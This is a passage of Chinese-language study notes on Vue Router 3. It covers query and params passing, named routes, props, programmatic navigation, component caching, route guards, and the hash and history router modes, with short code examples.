   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法（需要动态传参时） -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
              title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：（this.$route：跳转之后的路由）

   ```html
   this.$route.query.id
   this.$route.query.title
   ```



> 一个路由标签列表 
```vue
<li v-for="item in messageList" :key="item.id">
    <router-link 
        :to="{
            path: '/home/message/detail',
            query: {item: item}
        }" 
        active-class=""
    >

        {{item.title}}

    </router-link>
</li>
```



## 4.5 命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                          name:'hello' //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```html
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```



## 4.6 params参数

用params传参必须有两个配置：

1、路由规则里添加name，path里添加占位符

2、`:to` 为对象形式则不能写path，必须写name



1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
                      
                       // path:'detail/:id?' 使用问号表示可以传可以不传
   
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```html
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		    id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 1、路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！
   >
   > 2、如果参数为空字符串最好把空字符串变为undefined

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```



## 4.7 props 配置



作用：让路由组件更方便的收到参数，不用再 `this.$router.params/query....` 了！！！



### 4.7.1 params 参数简化

第一步：路由规则 添加 `props: true`

```js
{
    name: 'detail',
    
    path: 'detail/:id', // 参数占位符
        
    component: Detail,
        
    props: true
}
```

> 解释：props: true，则路由会把收到的所有params参数通过props传给Detail组件



第二步：发送参数

```vue
<router-link :to="{
        name: 'detail',
        params: {id: item.id}
    }" 				
>
```



第二步：路由对应组件接收参数（Detail.vue）

```js
// <h1>{{id}}</h1>  可以直接调用id

props: ['id']
```



### 4.7.2 query 参数简化

第一步：路由规则中 props 为一个函数

```js
{
    name: 'detail',
    path: 'detail',
    component: Detail,

    // 简化
    props(route) {
        return {id: route.query.id}
    }
}
```



第二步：发送参数

```vue
<router-link :to="{
        name: 'detail',
        query: {id: item.id}
    }" 				
>
```



第三步：组件接收参数（Detail.vue）

```js
// <h1>{{id}}</h1>  可以直接调用id

props: ['id']
```



## 4.8 ```<router-link>``` 的 replace 属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式



2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```



3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```



## 4.9 编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活


2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
       params:{
           id:xxx,
           title:xxx
       }
   })
   
   this.$router.replace({
   	name:'xiangqing',
       params:{
           id:xxx,
           title:xxx
       }
   })
   
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go(n) //可前进也可后退
   ```



使用vue-router3时的一个底层报错：使用编程式路由实现多次跳转同一个路由会报错

router/index.js：

```js
// 使用编程式路由实现跳转的时候，多次执行报错问题处理
// 重写push、replace来解决
let originPush=VueRouter.prototype.push;
let originReplace=VueRouter.prototype.replace;
VueRouter.prototype.push=function(location,resolve,reject){
    if(resolve&&reject){
        originPush.call(this,location,resolve,reject);
    }else{
        originPush.call(this,location,()=>{},()=>{});
    }
}
VueRouter.prototype.replace=function(location,resolve,reject){
    if(resolve&&reject){
        originReplace.call(this,location,resolve,reject);
    }else{
        originReplace.call(this,location,()=>{},()=>{});
    }
}
```



### 4.9.1 合并参数

当页面中的 `this.$route.query/params` 已经存在参数，并且我们还要跳转路由发送参数时，我们可以使用合并参数。 **就是发送参数的时候把已经存在的参数一起带上即可**

```js
goSearch() {
    this.$router.push({
        path: '/search',
        
        query: {
            value: this.searchWord,
            
            dataname: this.$route.query.dataname || '', // 已经存在的参数
        },
        
        params: ..., // 如果存在params参数也可以一起发送
    })
}
```





## 4.10 缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   这个 include 里面的是组件名

   ```html
   <keep-alive :include="['News',]"> 
       <router-view></router-view>
   </keep-alive>
   ```



## 4.11 两个新的生命周期钩子

作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
具体名字：
*  ```activated```路由组件被激活时触发。
*  ```deactivated```路由组件失活时触发。



注意：这两个生命周期钩子需要配合前面的缓存路由组件使用（没有缓存路由组件不起效果）



## 4.12 路由守卫

作用：对路由进行权限控制，访问路由时设置权限

分类：全局守卫、独享守卫、组件内守卫



### 4.12.1 mate配置

给路由添加自定义属性 

```js
meta: {isAuth: true, title: 'news'}

// 实现切换标题
router.afterEach(function(to,from) { 
    document.title = to.meta.title || 'Document';
})
```



### 4.12.2 全局守卫

分为两个函数，当成功访问该路由时，两个函数都被调用

to：目标路由   fom：当前路由  next()：放行函数，里面还可以填其他地址



**1、全局前置守卫**

初始化时执行、每次路由切换前判断权限  `router.beforeEach`

- 判断方法一：通过路径判断

```js
router.beforeEach(function(to,from,next) {
    // 判断path或name
    if(to.path == '/home/message' || to.name == 'news') {
    
        // 权限规则
        if(localStorage.getItem('school') == 'atguigu') {
            next();
        } else {
            alert('访问失败！')
        }
    
    } else {
        next();
    }
}) 
```



- 判断方法二：在路由规则的 mate 中添加自定义属性
```js
{
    path: 'news',
    component: News,

    meta: {isAuth: true}
},

if(to.path == '/home/message' || to.meta.isAuth)
```



**2、全局后置守卫**

初始化时执行、每次路由切换后执行  `router.afterEach`

```js
router.afterEach(function(to,from) {
    // 切换标题
    document.title = to.meta.title || 'Document';
})
```





### 4.12.3 独享守卫

在路由规则内部写，独有前置守卫函数 `beforeEnter()`

```js
{ 
    name: 'news',
    path: 'news',
    component: News,

    meta: {isAuth: true, title: 'news'},

    beforeEnter(to,from,next) {
        if(localStorage.getItem('school') == 'atguigu') {
            next();
        } else {
            alert('访问失败！')
        }
    }
},
```



### 4.12.4 组件内守卫

在组件里面编写

```js
//进入守卫：通过路由规则，进入该组件时被调用
beforeRouteEnter (to, from, next) {
},

    //离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) {
}
```





## 4.13 路由器的两种工作模式

```js
mode: 'history/hash'
```



1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。

2. hash值不会包含在 HTTP 请求中，即：**hash值不会带给服务器。**

3. hash模式：

   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。

4. history模式：

   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   2. **当页面刷新后会404报错**
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题



express框架解决方案：

```js
// 安装：npm install --save connect-history-api-fallback

// 解决路由器history模式刷新页面服务端404问题
const history = require('connect-history-api-fallback');
app.use(history());
```
